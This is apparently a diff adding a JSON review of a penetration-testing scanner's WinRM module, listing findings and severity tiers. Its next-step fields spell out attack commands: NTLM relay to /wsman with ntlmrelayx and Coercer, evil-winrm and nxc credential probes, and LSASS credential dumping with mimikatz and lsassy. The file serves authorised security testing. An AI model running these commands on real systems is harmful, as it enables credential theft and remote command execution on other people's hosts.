@@ -1,0 +1,81 @@
+{
+  "service": "winrm",
+  "summary": "WinRM module fingerprints via WSMan Identify (T0/T1) and pulls the pre-auth NTLM CHALLENGE off the Negotiate header (T1 info disclosure). Correctly flags Basic-over-HTTP and Negotiate-over-HTTP as relay targets. Never actually authenticates - even when creds are provided, only stages the evil-winrm command (per user directive). Biggest gap: no attempt to actually SEND a Basic credential when Basic-cleartext is detected, and no attempt to use user-supplied creds to test executability (nxc winrm probing).",
+  "module_files": [
+    "recce/services/winrm.py"
+  ],
+  "findings": [
+    {
+      "kind": "winrm_reachable",
+      "title_pattern": "WinRM reachable - Evil-WinRM / nxc winrm landing surface",
+      "severity": "medium",
+      "tier": "t0",
+      "tier_evidence": "WSMan Identify returned ProductVendor/ProductVersion - pure fingerprint. No auth attempted, no vuln inference. Just 'winrm is there'.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Promote by sending a POST with a marker Basic credential when Basic is offered and reading whether the server returns 401 vs 200/500 - proves the auth handler is live and processes credentials.",
+      "promotion_risk": "low",
+      "tester_next_step": "nxc winrm <ip> -u '' -p '' (auth null check); nxc winrm <ip> -u <user> -p <pass>; evil-winrm -i <ip> -u <user> -p <pass> for interactive shell if creds land."
+    },
+    {
+      "kind": "winrm_basic_plaintext",
+      "title_pattern": "WinRM accepts Basic authentication over plain HTTP",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "WWW-Authenticate header parsed directly - Basic offered on 5985/tcp is deterministic evidence any auth exposes cleartext. But no actual creds captured (relies on victim to type them).",
+      "can_promote_to": "t2",
+      "promotion_notes": "Stand up a passive listener (arp/hub) and demonstrate cred capture, or perform a canary Basic auth from tester and prove the request+password is recoverable from a pcap. Or actively try Basic with a marker password to confirm the handler.",
+      "promotion_risk": "medium",
+      "tester_next_step": "tcpdump -i <iface> -w winrm.pcap 'tcp port 5985' & then wait for real auth; or curl -kv -u USER:PASS http://<ip>:5985/wsman -H 'Content-Type: application/soap+xml' -d '<Identify/>' and confirm 200."
+    },
+    {
+      "kind": "winrm_basic",
+      "title_pattern": "WinRM Basic auth enabled (even over TLS this is worth checking)",
+      "severity": "low",
+      "tier": "t1",
+      "tier_evidence": "WWW-Authenticate directly observed offering Basic - Basic-over-TLS is confirmed present; hygiene issue rather than exposure.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Basic-over-TLS is mostly a hygiene concern; server-side cred re-use is real but requires host compromise to abuse.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -kv -u USER:PASS https://<ip>:5986/wsman -H 'Content-Type: application/soap+xml' -d '<Identify/>' to test."
+    },
+    {
+      "kind": "winrm_ntlm_info",
+      "title_pattern": "WinRM pre-auth NTLM CHALLENGE leaks host/domain intel",
+      "severity": "low",
+      "tier": "t1",
+      "tier_evidence": "One extra POST with Authorization: Negotiate <Type-1> and parse the Type-2 CHALLENGE returned in WWW-Authenticate - deterministic pre-auth AV_PAIR harvest.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Ceiling reached for info leak; value is feeding known_hostnames/known_domains cross-service (module already does this via host.ntlm merge).",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -kv -X POST http://<ip>:5985/wsman -H 'Authorization: Negotiate TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAA=' and base64-decode the WWW-Authenticate to inspect the CHALLENGE."
+    },
+    {
+      "kind": "winrm_relay_target",
+      "title_pattern": "WinRM speaks Negotiate/NTLM over plain HTTP - NTLM relay target",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "5985/tcp advertises Negotiate without TLS - direct observation; EPA (channel binding) cannot be enforced without TLS so this IS a relay target by protocol design.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Chain with coercion source from msrpc (PetitPotam/PrinterBug/DFSCoerce) + ntlmrelayx -t http://<ip>:5985/wsman for direct command execution as coerced principal. Depends on known_relay_targets + known_coerce_sources.",
+      "promotion_risk": "high",
+      "tester_next_step": "impacket-ntlmrelayx.py -t http://<ip>:5985/wsman -smb2support -c 'whoami /all' & then Coercer coerce -u <lp> -p <lpass> -t <victim> -l <you>. Successful relay = command exec as coerced computer account."
+    },
+    {
+      "kind": "winrm_credssp",
+      "title_pattern": "WinRM offers CredSSP (delegates credentials to this host)",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "CredSSP directly observed in WWW-Authenticate - the delegation posture is confirmed; abuse requires the host to be compromised first (post-compromise credential theft primitive).",
+      "can_promote_to": "t2",
+      "promotion_notes": "Once landed on this host with any account: dump LSASS for delegated plaintext creds (mimikatz sekurlsa::logonpasswords). Standalone probe alone stays T1.",
+      "promotion_risk": "high",
+      "tester_next_step": "Once on the host: mimikatz # sekurlsa::logonpasswords; or nxc winrm <ip> -u <admin> -p <p> -M lsassy for remote LSASS dump (needs local admin)."
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_relay_targets (produce - HTTP WinRM listener with Negotiate is a relay target)",
+    "known_hostnames (consume+produce via NTLM CHALLENGE harvest)",
+    "known_domains (produce)",
+    "cred_store (consume - test supplied cred via nxc winrm probe)"
+  ]
+}
